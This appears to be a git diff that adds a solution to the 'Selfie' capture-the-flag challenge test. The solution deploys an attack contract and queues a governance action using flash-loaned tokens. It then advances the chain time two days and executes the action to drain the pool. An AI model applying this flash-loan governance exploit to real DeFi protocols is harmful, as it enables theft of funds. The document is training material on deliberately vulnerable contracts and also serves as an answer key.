@@ -38,7 +38,13 @@ describe('[Challenge] Selfie', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+        let solution = await (await ethers.getContractFactory('SelfieSolution', player))
+            .deploy(pool.address, governance.address);
+
+        await solution.connect(player).flashAndQueue();
+        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 2 days
+
+        await governance.connect(player).executeAction(1);
     });
 
     after(async function () {
